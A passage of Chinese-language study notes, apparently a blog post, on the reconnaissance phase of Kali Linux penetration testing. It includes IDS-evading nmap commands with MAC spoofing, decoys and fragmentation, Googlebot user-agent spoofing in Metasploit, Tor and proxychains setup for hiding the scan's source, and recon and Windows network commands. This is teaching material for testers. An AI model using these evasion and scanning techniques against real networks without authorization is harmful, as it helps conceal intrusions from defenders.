调整源IP栈和工具识别设置</h3><p>在测试开始前，需要禁用或关闭所有kali不必要的服务</p><p>如运行的不是必需的本地DHCP守护进程，DHCP可能与目标系统进行交互，且交互可能被记录</p><p>一些商业和开源工具(例如Metasploit框架)用一个标识序列标记它们的数据包。这可能对测试后的分析系统的事件日志有用，但是也可能触发某些入侵检测系统</p><p>识别标签最简单的方法是，使用工具在虚拟目录系统上创建新的应用，然后查看系统日志中与工具名称相关的记录，此外，使用Wireshark捕获攻击者和目标虚拟机之间的信息流，之后搜索抓包(packet capture,pcap)文件，寻找由测试工具产生的那些关键字（工具的名称、供应商、证书序列号等），也是一种有效的方法</p><p>Metasploit框架中的用户代理（useragent）可以通过修改http_form_field选项改变。在msfconsole提示下，选择使用auxiliary/fuzzers/http/http_form_field选项，然后设置一个新的useragent头</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">use use auxiliary/fuzzers/http/http_form_field <br><span class="hljs-built_in">set</span> useragent<br><span class="hljs-built_in">set</span> useragent Googlebot-Image/1.0<br></code></pre></div></td></tr></table></figure><p>useragent被设定为Google的索引爬虫——Googlebot-Image。这是一种常用的自动化应用程序，用于访问和索引网站，很少引起网站所有者的注意</p><p>识别合法的useragent头，参考示例：<a href="http://www.useragentstring.com/">http://www.useragentstring.com</a></p><h3 id="1-1-2-修改数据包参数"><a href="#1-1-2-修改数据包参数" class="headerlink" title="1.1.2 修改数据包参数"></a>1.1.2 修改数据包参数</h3><p>主动侦察最常见的方式是对目标发动扫描–发送定义的数据包到目标，然后利用返回的数据包来获取学习。这种类型最常见的工具是<strong>网络映射器</strong>(Network Mapper,nmap)</p><p>用一些秘密技术来避免检测及随后的报警，包括以下内容：</p><ul><li>测试之前确定扫描的目标，发送需要确定目标的最小数量的数据包</li><li>避免可能与目标系统连接的扫描，避免可能泄露数据的扫描。不要ping目标，或者使用同步(SYN)和非常规数据包扫描，如确认(ACK)、完成(FIN)和复位(RST)数据包</li><li>随机化或掩饰包设置，如源IP和端口地址，以及MAC地址</li><li>调节定时以减缓目标站点包的到来</li><li>通过包的分解或附加随机数据来改变数据包大小，以及混淆设备对数据包的检测</li></ul><p>参考：秘密扫描并且最小化被检测到的可能的nmap命令</p><p><code>nmap --spoof-mac Cisco --data-length 24 -T paranoid --max-hostgroup 1 --max-parallelism 10 -Pn -f -D 10.1.20.5,RND:5,ME -v -n -sS -sV -oA /desktop/pentest/nmap/out -p T:1-1024 --randomize-host 10.1.1.10 10.1.1.15</code></p><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>–spoof-mac Cisco</td><td>伪造MAC地址匹配思科(Cisco)产品。用0更换Cisco将创建一个完全随机的MAC地址</td></tr><tr><td>–data-length 24</td><td>向大多数正在发送的包附加24字节的随机数据</td></tr><tr><td>-T paranoid</td><td>设置时间到最慢，paranoid</td></tr><tr><td>–max-hostgroup</td><td>限制一次扫描的主机数</td></tr><tr><td>–max-parallelism</td><td>限制发送有效探针的数量。也可以使用–scan-delay选项，设置两个探针之间的停顿。此选项与–max-parallelism选项不兼容</td></tr><tr><td>-Pn</td><td>不用ping确定活动系统(这可能泄露数据)</td></tr><tr><td>-f</td><td>分割数据包，经常欺骗低端和配置不正确的ID</td></tr><tr><td>-D 10.1.20.5,RND:5,ME</td><td>创建诱饵扫描，与攻击者的扫描同时运行，隐藏实际攻击</td></tr><tr><td>-n</td><td>没有DNS解析：内部或外部DNS服务器不响应通过nmap提交的DNS信息查询。这样的查询经常被记录，所以查询功能应该被禁用</td></tr><tr><td>-sS</td><td>进行秘密的TCP SYN扫描，并不需要完整的TCP握手。其他扫描类型(例如空扫描)也可以使用，但是，大多数行为都会触发设备检测</td></tr><tr><td>-sV</td><td>启动版本检测</td></tr><tr><td>-oA  /desktop/pentest/nmap</td><td>将结果输出为各种格式(正常，greppable和XML)</td></tr><tr><td>-p T:1-1024</td><td>指定要扫描的TCP端口</td></tr><tr><td>–random-hosts</td><td>随机化目标主机的次序</td></tr></tbody></table><p>这些选项将创建一个非常缓慢的扫描，隐藏扫描源的真实身份。然而，如果数据包太不常用、修改太多，也可能引起目标的注意。因此，许多测试者和攻击者利用匿名网络，尽量最小化被检测到的可能</p><h3 id="1-1-3-使用匿名网络代理"><a href="#1-1-3-使用匿名网络代理" class="headerlink" title="1.1.3 使用匿名网络代理"></a>1.1.3 使用匿名网络代理</h3><p>网络上保持匿名性所使用的两个重要工具——Tor和Privoxy</p><p><a href="www.torproject.org">Tor</a>是第三代洋葱路由开源软件，提供免费接入的匿名网络代理。洋葱路由加密用户流量使网络匿名，然后通过一系列的洋葱路由器发送匿名流量。在每个路由器上，删除一层加密，得到路由信息，然后再将该消息发送到下一个节点。它被比喻为逐步剥洋葱，故以此命名。它通过保护用户的IP流的源地址和目的地址，抵御流量分析的攻击</p><p>在本例中Tor会与Privoxy一起使用，这是一个非高速缓存的Web代理，位于与互联网通信的应用程序的中间，利用先进的过滤技术，保护用户隐私、移除广告，并将潜在的恶意数据发送给测试者</p><p>安装Tor，需要执行以下步骤</p><ol><li><p>首先执行更新命令<code>apt-get update</code>和<code>apt-get upgrade</code>之后安装Tor命令<code>apt-get install tor</code></p></li><li><p>安装Tor之后，编辑位于/etc目录下的proxychains.conf文件。该文件规定了测试系统在使用Tor网络系统时使用代理服务器的数量和顺序。代理服务器可能停止工作，或者可能遇到重负载（导致缓慢或潜连接）。如果发生这种情况，一个清晰的或严密的ProxyChain将失效，因为预期链路丢失。因此，禁用strict_chain，并且启用dynamic_chain，这就保证了连接将被路由</p></li><li><p>编辑<strong>ProxyList</strong>部分(同上文件中)，以确保socks5代理存在(实际操作中，socks5使用失败(time out)，设置为http后成功了，不清楚原因？？？)</p><p> <img src="https://res.weread.qq.com/wrepub/epub_33211566_92" alt="ProxyList编辑"></p></li><li><p>从终端窗口启动Tor服务 <code>service tor start</code></p></li><li><p>验证Tor是否启动 <code>service tor status</code></p></li><li><p>确认自己的源IP地址 <code>firefox www.whatismyip.com</code></p></li><li><p>注意IP地址，然后使用proxychains命令调用Tor路由 <code>proxychains firefox www.whatismyip.com</code></p></li></ol><p>通过访问<a href="https://check.torproject.org,可以验证tor的功能是否正常(此处验证始终失败,暂时无法解决)/">https://check.torproject.org，可以验证Tor的功能是否正常(此处验证始终失败，暂时无法解决)</a></p><p><strong>注意</strong>：通信现在已经通过使用Tor网络得到保护，但当你的系统使DNS请求提供你的身份到ISP时，DNS可能发生泄漏。你可以检查DNS泄漏，地址为：<a href="http://www.dnsleaktest.com/">www.dnsleaktest.com</a></p><p>此时大多数命令行可以在使用proxychains访问Tor网络的控制台上运行</p><p>使用Tor时，需要牢记以下注意事项：</p><ul><li>Tor提供匿名访问，但是不能保证隐私。出口节点的所有者能够发觉流量，也可能会访问用户的凭证</li><li>在Tor浏览器套件中的漏洞，被称为执法部门用于探测系统并获取用户信息</li><li>ProxyChains不处理UDP流量</li><li>某些应用程序和服务无法在这样的环境下运行，实际上，Metasploit与nmap可能不能运行。nmap的隐式SYN扫描被ProxyChain终止，且连接扫描被调用。这可能会泄露信息</li><li>某些应用程序和服务无法在这样的环境下运行，实际上，Metasploit与nmap可能不能运行。nmap的隐式SYN扫描被ProxyChain终止，且连接扫描被调用。这可能会泄露信息</li><li>攻击者也可以使用随机链接。使用此选项，ProxyChain将从列表中随机选择IP地址（本地以太网IP，例如127.0.0.1，192.168.x.x或172.16.x.x），并用它们来创建ProxyChain。这意味着每次使用ProxyChain时，代理链将看起来与目标不同，从而更难从源头跟踪流量</li><li>为此，以类似的方式编辑/etc/proxychains.conf文件，将dynamic chains改为注释，取消random_chain注释，因为我们一次只能使用一个选项</li><li>此外，攻击者可以使用chain_len取消注释行，然后在创建一个随机代理链时确定链中的IP地址数</li></ul><p>Tor-Buddy脚本允许控制Tor IP地址的刷新频率，但是自动识别用户的信息非常困难（<a href="http://sourceforge.net/projects/linuxscripts/files/Tor-Buddy/%EF%BC%89">http://sourceforge.net/projects/linuxscripts/files/Tor-Buddy/）</a></p><h2 id="1-2-DNS侦察和路由映射"><a href="#1-2-DNS侦察和路由映射" class="headerlink" title="1.2 DNS侦察和路由映射"></a>1.2 DNS侦察和路由映射</h2><p>识别目标的IP地址和路由</p><p>DNS侦察关心的是：识别谁拥有一个特定域或一系列IP地址（这些信息可以通过whois获取，尽管该行为被欧盟颁布的《通用数据保护条例》禁止），定义实际域名的DNS信息和标识目标的IP地址，以及在渗透测试人员或攻击者与最终目标之间的路由</p><p>收集该类信息是半主动的，一些信息是免费开源的(例如DNSstuff.com)，另一些信息则来自第三方实体(例如DNS注册机构)</p><p>由于所需要的信息能被确定的系统性方法查询到，因此可以自动收集这些信息</p><p>注意：DNS信息可能包括旧的或者不正确的单元。可以通过查询不同源服务器以及不同的工具来交叉验证结果</p><p>Whois命令(后GDPR时代)</p><p>whois命令一直是用于识别IP地址的第一步，直到《通用数据保护条例》实施</p><p>对whois请求的响应将会提供名字、物理地址、电话号码和电子邮件地址（可用于社会工程学攻击），也包括IP地址和DNS服务器名</p><p>示例如下：</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210829213520.png" alt="whois示例"></p><h2 id="1-3-利用综合侦察应用测序"><a href="#1-3-利用综合侦察应用测序" class="headerlink" title="1.3 利用综合侦察应用测序"></a>1.3 利用综合侦察应用测序</h2><p>虽然Kali包含多个工具以促进侦察，但是许多工具包含相同的功能，此处介绍最初综合侦探工具中常用DMitry（Deep Magic Information Gathering Tool，DMitry）工具</p><p><code>dmitry -winsepo out.txt www.cyberhia.com</code></p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210829232625.png" alt="dmitry示例"></p><p>接下来详细介绍recon-ng框架</p><h3 id="1-3-1-recon-ng框架"><a href="#1-3-1-recon-ng框架" class="headerlink" title="1.3.1 recon-ng框架"></a>1.3.1 recon-ng框架</h3><p>recon-ng框架是进行(主动和被动)侦察的开源框架。与Metasploit框架和社会工程学工具包(Social Engineer Toolkit,SEToolkit)类似。recon-ng采用模块化的框架</p><p>recon-ng框架及其模块是用Python编写的，允许渗透测试人员轻松地构建或改变模块以方便测试，可以自己设置useragent字符串或代理请求</p><p>kali中已经默认安装，启动命令<code>recon-ng</code>查看帮助<code>help</code>(现在新版的recon-ng需要科学上网后下载模块后使用<code>marketplace install all</code>安装全部插件，或者<code>marketplace install recon/domains-hosts/hackertarget</code>进行单个下载)</p><p>之后类似Metasploit框架的内容，搜索模块(市场搜索<code>marketplace search **</code>)<code>modules search **</code>加载模块(示例<code>modules load **</code>)查看模块的详细信息<code>info</code>列出模块选项参数<code>options list</code>设置模块参数<code>options set ** **</code>最后<code>run</code>！</p><p>总的来说，测试人员依靠recon-ng可以完成以下几点：</p><ul><li>使用Whois来获得连接，包括Jigsaw、Linkedin和Twitter</li><li>识别主机</li><li>使用hostop、ipinfodb、maxmind、uniapple和wigle识别主机及个人的地理位置</li><li>使用netcraft及相关模块识别主机信息</li><li>识别以前被攻击入侵过并在互联网上泄露过的账户及其密码信息（pwnedlist模块、wascompanyhacked、xssed和punkspider）</li></ul><p><strong>IPV4</strong></p><p>IP（互联网协议）地址是识别连接到私有网或者公共网的设备的唯一号码。当今的互联网大部分是基于IPv4的。Kali包含几个工具用来方便DNS侦察</p><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>dnsenum、dnsmap和dnsrecon</td><td>这些是综合的DNS扫描器——DNS记录枚举（A、MX、TXT、SOA、通配符等）、子域暴力破解、Google查找、反向查找、区域转换、以及区域移动。dnsrecon通常是第一选择——结果容易理解，数据可直接输入到Metasploit框架</td></tr><tr><td>dnstracer</td><td>决定了从哪里得到一个给定的DNS的信息，并伴随着DNS服务器链，回到拥有数据的服务器</td></tr><tr><td>dnswalk</td><td>DNS调试器，为具体的域检查其内部的一致性和准确性</td></tr><tr><td>fierce</td><td>针对具体的域，试着通过区域转换和暴力破解得到DNS信息，定位非连接的IP空间和主机名</td></tr></tbody></table><p>测试期间，常运行fierce来确认已经识别的所有可能的目标，然后运行至少两个综合性的工具（例如dnsenum和dnsrecon）来生成最多的数据，并提供一个交叉验证等级</p><p>使用dnsrecon生成一个标准的DNS记录搜索，并且该搜索是特定于SRV记录的</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210830233416.png" alt="dnsrecon搜索"></p><p>dnsrecon允许渗透测试人员获得SOA记录、<strong>名称服务器</strong>（Name Server，NS）、<strong>邮件交换</strong>（Mail Exchanger，MX）主机、使用<strong>发送者政策框架</strong>（Sender PolicyFramework，SPF）发送电子邮件的服务器，以及使用的IP地址范围</p><p><strong>IPV6</strong></p><p>目前IPv6的正在逐渐普及，所以在测试中必须考虑IPv6，原因如下：</p><ul><li>测试工具对IPv6功能的支持不是普遍的，所以必须确定每一个工具在IPv4、IPv6、混合网络中的性能和准确性</li><li>由于IPv6是一个相当新的协议，目标网络可能包含泄露重要数据的错误配置，测试人员必须准备好识别并利用这个信息</li><li>早先的网络协议（防火墙、IDS和IPS）可能不会测出IPv6。在这些情况下，渗透测试人员可以利用IPv6信道保持与网络的隐蔽通信，并泄露出未检测到的数据</li></ul><h3 id="1-3-2-IPv6专用工具"><a href="#1-3-2-IPv6专用工具" class="headerlink" title="1.3.2 IPv6专用工具"></a>1.3.2 IPv6专用工具</h3><p>kali包含的支持IPv6的工具</p><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>dnsdict6</td><td>使用基于具备字典文件或者它自己的互联网列表的暴力搜索来列举子域名，从而获得已存在的IPv4和IPv6地址</td></tr><tr><td>dnsrevenum6</td><td>给定一个IPv6地址，执行反DNS枚举</td></tr><tr><td>covert_send6</td><td>把文件内容隐蔽地发送到目标</td></tr><tr><td>covert_send6d</td><td>把收到的内容隐蔽地写入文件</td></tr><tr><td>denial6</td><td>对目标执行各种拒绝服务攻击</td></tr><tr><td>detect-new-ip6</td><td>此工具可以检测加入本地网络的新IPv6地址</td></tr><tr><td>detect_sniffer6</td><td>测试本地LAN上的系统是否正在嗅探</td></tr><tr><td>exploit6</td><td>在目的地上执行各种CVE已知的IPv6漏洞利用</td></tr><tr><td>fake_dhcps6</td><td>虚假DHCPv6服务器</td></tr></tbody></table><p>Metasploit也可以用于IPv6主机发现。auxiliary/scanner/discovery/ipv6_multicast_ping模块将发现具有物理（MAC）地址的所有启用IPv6的计算机(测试失败)</p><p>atk6-alive6将发现同一段中活跃的地址命令<code>atk6-alive6</code></p><h3 id="1-3-3-映射路由到目标"><a href="#1-3-3-映射路由到目标" class="headerlink" title="1.3.3 映射路由到目标"></a>1.3.3 映射路由到目标</h3><p>路由映射最开始是一个路由诊断工具，用于查看IP数据包从一个主机到另一个主机的路由连接。通过使用IP数据包中的存活时间TTL（Time To Live）变量，每一跳（hop）在从一点到下一点时，从接收路由器引出一个ICMPTIME_EXCEEDED消息，同时TTL字段的值减1。数据包会计算跳以及使用的路由器的数量</p><p>从攻击者的角度来看，traceroute数据有以下重要信息：</p><ul><li>攻击者与目标之间的准确路径</li><li>关于网络外部拓扑结构的提示</li><li>识别可能过滤攻击流的访问控制设备(防火墙和包过滤路由器)</li><li>如果网络配置错误，可能会识别内部地址</li></ul><p>在kali中traceroute是命令行程序，在windows系统中，该程序是tracert</p><p>kali启动traceroute <code>traceroute 域名/IP</code>，和windows执行tracert <code>traceroute 域名/IP</code>效果如下</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210903113442.png" alt="kali traceroute"></p><p>Kali中测试结果基本为* * *</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210903113632.png" alt="windows tracer"></p><p>windows中有相对更加详细的信息</p><p>使用命令后我们能够得到相对完整的路径，还可能发现相同的域名被解析为不同的IP地址，这表明负载均衡器在起作用（此时可以使用Kali的lbd脚本来确认其是否起作用，该活动可能被目标站点记录）</p><p>在kali中提供以下路由跟踪工具</p><table><thead><tr><th>工具</th><th>说明</th></tr></thead><tbody><tr><td>hping3</td><td>TCP/IP数据包的汇编器和分析器。支持TCP、UDP、ICMP以及raw-IP，并使用一个类似ping的界面</td></tr><tr><td>intrace</td><td>通过利用现有的TCP连接，包括从本地系统或者网络或本地主机，该程序使用户能计算IP跳数。这对绕过外部过滤器(防火墙等)是很有用的。intrace用来代替无可信保障的0trace程序</td></tr><tr><td>trace6</td><td>使用ICMP6的traceroute工具</td></tr></tbody></table><p>hping3是最常用的工具</p><p>参考命令<code>hping3 -S www.tencent.com -p 80 -c 5</code></p><ul><li>使用有SYN标识集（-S）的TCP向目标发送一个类ping命令</li><li>把数据包直接发送到80端口，该类型的请求是很少被阻塞的（-p 80）</li><li>为发送给目标的五三个数据包设置计数（-c 5）</li></ul><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210903124250.png" alt="hping3 示例"></p><h2 id="1-4-识别外部网络基础设施"><a href="#1-4-识别外部网络基础设施" class="headerlink" title="1.4 识别外部网络基础设施"></a>1.4 识别外部网络基础设施</h2><p>确定网络上的互联网可接入部分的设备。</p><p>利用这些信息做到以下几点：</p><ul><li>确定可能混淆(负载均衡器)或消除(防火墙和数据包检查设备)测试结果的设备</li><li>识别已知漏洞的设备</li><li>识别继续实施秘密扫描的需求</li><li>获得目标对安全体系和一般安全性的关注的理解</li></ul><p>traceroute提供关于包过滤能力的基本信息，kali中的一些其他应用如下</p><table><thead><tr><th>应用</th><th>描述</th></tr></thead><tbody><tr><td>lbd</td><td>使用基于DNS和HTTP的技术来检测放在均衡器</td></tr><tr><td>miranda.py</td><td>确定通用的即插即用和UPNP设备</td></tr><tr><td>nmap</td><td>检查设备并确定操作系统及其版本</td></tr><tr><td>Shodan</td><td>基于Web的搜索引擎，识别连接到互联网的设备，包括那些默认密码，已知错误配置和漏洞等等</td></tr><tr><td>censys.io</td><td>类似Shodan搜索，同样具有证书详细信息，技术信息，错误配置和已知漏洞</td></tr></tbody></table><p>显示的是在运行lbd脚本获得的结果。可以看到，的网站上使用了DNS–Loadbalancing而没有使用HTTP–Loadbalancing。负载均衡器作为一个特定的工具，将活动从一个服务器转移到了另一个服务器</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210903151158.png" alt="lbd示例"></p><h2 id="1-5-防火墙外映射"><a href="#1-5-防火墙外映射" class="headerlink" title="1.5 防火墙外映射"></a>1.5 防火墙外映射</h2><p>尝试多次traceroute之后如果有特定的IP无法绕过，则可能为一个过滤设备，之后需要深入的了解该IP上的内容</p><h2 id="1-6-IDS-IPS识别"><a href="#1-6-IDS-IPS识别" class="headerlink" title="1.6 IDS/IPS识别"></a>1.6 IDS/IPS识别</h2><p>利用fragroute和Wafw00f来识别特定位置是否存在任何检测或预防机制，例如入侵检测系统（Intrusion Detection System，IDS）/入侵防御系统（Intrusion Prevention System，IPS）/Web应用防火墙（Web ApplicationFirewall，WAF）</p><p>Kali中通常使用fragroute以及wafw00f来识别，判断。</p><p>其中fragroute，在自己安装的最新的kali中没有，并且apt-get install fragroute一样没有具体的包(暂时无法进行操作)，网上查看资料后安装fragrouter</p><p>wafw00f是用于识别Web应用程序防火墙,其中<code>wafw00f -l</code>为列出提供的WAF列表</p><p><code>wafw00f url/ip</code>检测命令</p><h2 id="1-7-枚举主机"><a href="#1-7-枚举主机" class="headerlink" title="1.7 枚举主机"></a>1.7 枚举主机</h2><p>仅仅知道服务器或无线接入点存在是不够的，还需要确定开放端口，基本操作系统，运行的各种访问、支撑的各种应用等等</p><p>发现活跃主机的方法通常使用的工具有</p><table><thead><tr><th>工具</th><th>说明</th></tr></thead><tbody><tr><td>alive6和detect-new-ip6</td><td>IPv6主机检测，detect-new-ip6运行在基本脚本上，确定新IPv6设备加入</td></tr><tr><td>Dnmap和nmap</td><td>nmap是标准的网络枚举工具。而Dnmap是nmap扫描器的一种分布式客户端-服务器实现<br>PBNJ将nmap结果存储在数据库中，并构造历史分析用于识别新主机</td></tr><tr><td>fping、hping2、hping3和nping</td><td>发包工具，用各种方式响应目标以确定活跃主机</td></tr></tbody></table><p>具体举例如何使用在下一节中</p><h2 id="1-8-识别端口、操作系统和服务"><a href="#1-8-识别端口、操作系统和服务" class="headerlink" title="1.8 识别端口、操作系统和服务"></a>1.8 识别端口、操作系统和服务</h2><p>识别远程主机上的开放端口、操作系统和安装的服务。这些功能大多可以使用nmap完成</p><p>端口扫描是连接到TCP和UDP端口，从而确定何种服务，何种应用程序在目标设备上运行的过程。</p><p>通用端口映射工具nmap依靠活动栈指纹。特质的数据包发送到目标系统，nmap以操作系统对这些数据包的响应来识别这些操作系统。nmap正常工作需要有一个监听端口开发，而操作系统必须是已知和有指纹的</p><p>将nmap用于端口发现有很大的噪声，将被网络安全设备检测并记录</p><ul><li>侧重于隐形技术的攻击者和渗透测试人员只测试那些影响他们所追踪的特定目标的杀链的端口。如果他们已在发起了对Web服务器的漏洞的攻击，他们通过可访问的80端口或8080端口搜索目标</li><li>大多数端口扫描器都有一个默认扫描端口列表，确保你知道什么在列表上，什么被省略。同时考虑TCP端口和UDP端口</li><li>成功的扫描需要TCP/IP及相关协议、网络和一些特殊工具工作原理的深度知识。例如，SCTP是网络上一个越来越普遍的协议，但它很少在企业网络上测试</li><li>即使慢慢来，端口扫描也会影响网络。对一些较旧的网络设备，以及供应商的一些特定设备，在接收或传输端口扫描时会锁定，从而把扫描转换为一个拒绝服务攻击</li><li>用来扫描一个端口的工具，尤其是nmap，正在扩展常规的功能。它们也可以用来检测漏洞，甚至利用简单的安全漏洞</li></ul><h2 id="1-9-使用netcat编写自己的端口扫描器"><a href="#1-9-使用netcat编写自己的端口扫描器" class="headerlink" title="1.9 使用netcat编写自己的端口扫描器"></a>1.9 使用netcat编写自己的端口扫描器</h2><p>通过netcat使用以下命令行，在渗透测试中识别开放端口列表</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 对列表中的IP地址进行TCP全端口的扫描</span><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> r; <span class="hljs-keyword">do</span> nc -v -z <span class="hljs-variable">$r</span> 1-65535; <span class="hljs-keyword">done</span> &lt; iplist<br><span class="hljs-comment"># 通过实际测试，代码含义是逐行读取iplist文件中的内容，并扫描端口1-65535</span><br><span class="hljs-comment"># 此时有小问题，及nc自己的虚拟机时不管端口是否开启都十分迅速，而真实机器时速度十分慢</span><br><span class="hljs-comment"># 对指定IP的进行部分选择端口的扫描</span><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> r; <span class="hljs-keyword">do</span> nc -v -z IP <span class="hljs-variable">$r</span>;<span class="hljs-keyword">done</span> &lt; ports<br></code></pre></div></td></tr></table></figure><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210905191117.png" alt="自定义nc扫描IP"></p><p>此处为了节省时间只进行了少部分端口的扫描</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210905191349.png" alt="自定义扫描IP端口"></p><p>注意使用自定义端口扫描器扫描入侵检测系统时，产生警报的概率很高</p><h3 id="1-9-1-指纹识别操作系统"><a href="#1-9-1-指纹识别操作系统" class="headerlink" title="1.9.1 指纹识别操作系统"></a>1.9.1 指纹识别操作系统</h3><p>确定远程系统的操作系统，使用以下两种类型扫描</p><ul><li>主动指纹识别(active fingerprinting): 攻击者通过发送正常的和异常的数据包到目标系统，记录它们对应的反应模式，称其为指纹(fingerprint)。将指纹与本地数据库比较，操作系统可被确定</li><li>被动指纹识别(passive fingerprinting): 攻击者嗅探或记录和分析数据包流，以确定该分组的特性</li></ul><p>主动指纹扫描比被动指纹更快、更准确。在kali中，两个只要的主动工具是nmap和xprobe2</p><p>nmap工具注入数据包到目标网络，并分析它收到的响应。命令<code>nmap -sS -O target.com</code>，-O标志命令nmap确定操作系统</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210905194256.png" alt="namp示例"></p><p>xprobe2使用不同的TCP、UDP和ICMP数据包绕过防火墙，避免被IDS/IPS系统测试。xprobe2还使用模糊模式匹配：操作系统不会被确定为一种类型</p><p>命令<code>xprobe2 IP/url</code></p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210905195054.png" alt="xprobe2"></p><p>具体xprobe2命令<a href="https://blog.csdn.net/qq_40633669/article/details/84656228">参考</a>（感觉不太好用）</p><p><strong>注意</strong>：目标系统很容易隐藏真实的操作系统。因为指纹软件依赖于分组包设置，如生存时间或初始窗口大小，改变这些值或其他用户可配置的设置，可以改变工具的结果。有些组织积极改变这些值，使侦察的最后阶段更加困难</p><h3 id="1-9-2-确定主动服务"><a href="#1-9-2-确定主动服务" class="headerlink" title="1.9.2 确定主动服务"></a>1.9.2 确定主动服务</h3><p>侦察枚举部分的最终目标是确定运行在目标系统上的服务和应用。可能的话，具体到服务类型、供应商和版本，以确定具体的漏洞</p><p>用于确定主动服务的几种技术：</p><ul><li><p>确定默认的端口和服务：绕过远程系统被识别为微软操作系统且80端口(WWW服务)为打开状态，攻击者可能会认为默认安装的是微软IIS服务器，并进一步的测试来验证这种假设(nmap)</p></li><li><p>标志提取：使用amap、netcat、nmap和远程登录等工具完成该任务</p></li><li><p>审计默认网页：一些应用程序安装使用默认的管理、错误或其他页面。服务这些网页可能会提供安装应用程序的指导，这可能是攻击的漏洞</p></li><li><p>审查源代码：配置不当的基于Web的应用程序可能应答某些HTTP请求，如头部（HEAD）或选项（OPTIONS），回应包括Web服务器软件版本，或基础操作系统，或使用的脚本环境。此处书中举例为</p><p>  <img src="https://res.weread.qq.com/wrepub/epub_33211566_131"></p><p>  图中暴露了具体的web服务器具体版本Apache/2.4.37，应用服务器为PHP/5.6.39</p></li></ul><h2 id="1-10-大规模扫描"><a href="#1-10-大规模扫描" class="headerlink" title="1.10 大规模扫描"></a>1.10 大规模扫描</h2><p>此处介绍了Masscan，该工具能快速分析目标网络中的活跃主机，大优势是随机分配主机、端口、速度、灵活性和兼容性。</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210905200344.png" alt="Masscan示例"></p><h3 id="1-10-1-DHCP信息"><a href="#1-10-1-DHCP信息" class="headerlink" title="1.10.1 DHCP信息"></a>1.10.1 DHCP信息</h3><p>动态主机配置协议(Dynamic Host Configuration Protocol,DHCP)是为网络上的主机动态分配IP地址的服务，协议运行在TCP/IP协议栈的数据链路层的MAC子层上运行。具体的操作流程为：客户端将向DHCP服务器发送广播查询，当从DHCP服务器接收到响应时，客户端再向DHCP服务器发送广播查询请求所需信息。服务器现在将为其分配配置参数（如子网掩码、DNS和默认网关）及一个IP地址</p><p>连接到网络，嗅探(Sniffing)就是被动收集信息的最好的方法。如下图能够看到很多广播流量</p><p><img src="https://res.weread.qq.com/wrepub/epub_33211566_133"></p><p>图中有DNS、NBNS、BROWSER和其他协议的流量，这些协议可能会泄露主机名、VLAN信息、域，以及活动子网</p><h3 id="1-10-2-内部网络主机的识别与枚举"><a href="#1-10-2-内部网络主机的识别与枚举" class="headerlink" title="1.10.2 内部网络主机的识别与枚举"></a>1.10.2 内部网络主机的识别与枚举</h3><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210906123355.png" alt="ifconfig示例"></p><p>使用ifconfig可以获取以下信息：</p><ul><li>inet：DHCP服务器获取的IP信息应当给我们提供至少一个活跃的子网，我们可以使用它通过不同的扫描技术来识别实时系统和服务的列表</li><li>netmask：此信息可用于计算子网范围，图中显示的是255.255.255.0，这意味着CIDR是/24，我们可能期望子网上有255台主机</li><li>默认网关：网关的IP信息将提供ping其他类似网关IP的机会。例如，如果默认网关IP为192.168.1.1，则使用ping扫描攻击者可能能够枚举出其他类似的IP，如192.168.2.1、192.168.3.1等</li><li>其他IP地址：可通过访问/etc/resolv.conf文件获取DNS信息。该文件中的IP地址通常在所有子网中进行寻址，域信息也将在同一文件中自动可用</li></ul><h3 id="1-10-3-本地MS-Windows命令"><a href="#1-10-3-本地MS-Windows命令" class="headerlink" title="1.10.3 本地MS Windows命令"></a>1.10.3 本地MS Windows命令</h3><p>下列表中提供了渗透测试练习中部分常用的命令列表</p><table><thead><tr><th>命令</th><th>举例</th><th>说明</th></tr></thead><tbody><tr><td>net use</td><td>net use \\[targetIP] [password] /user:[user]<br>net use \\[targetIP]\[sharename] [password] /user:[user]</td><td>连接到同一网络上的任何系统。它也可以用于检索网络连接列表</td></tr><tr><td>net user</td><td>net user [UserName [Password | *] [options]] [/domain]<br>net user [UserName] {Password | *} /add [option] [/domain]]<br>net user [UserName [/delete] [/domain]]</td><td>显示有关用户的信息，并执行与用户账户相关的活动</td></tr><tr><td>arp</td><td>arp /a<br>arp /a /n 10.0.0.99<br>arp /s 10.0.0.80 00-AA-00-4F-2A-9C</td><td>显示并修改ARP缓存中的任何条目</td></tr><tr><td>route</td><td>route print<br>route print 10.* <br>route add 0.0.0.0 mask 0.0.0.0 192.168.1.1<br>route delete 10.*</td><td>与ARP类似，可以利用route来了解本地IP路由，并修改此信息</td></tr><tr><td>netstat</td><td>netstat -n -o</td><td>显示本地系统上的所有活动TCP连接和端口，即监听以太网和IP路由表(IPv4和IPv6)以及统计信息</td></tr><tr><td>nbtstat</td><td>nbtstat /R<br>nbtstat /S 5<br>nbtstat /a 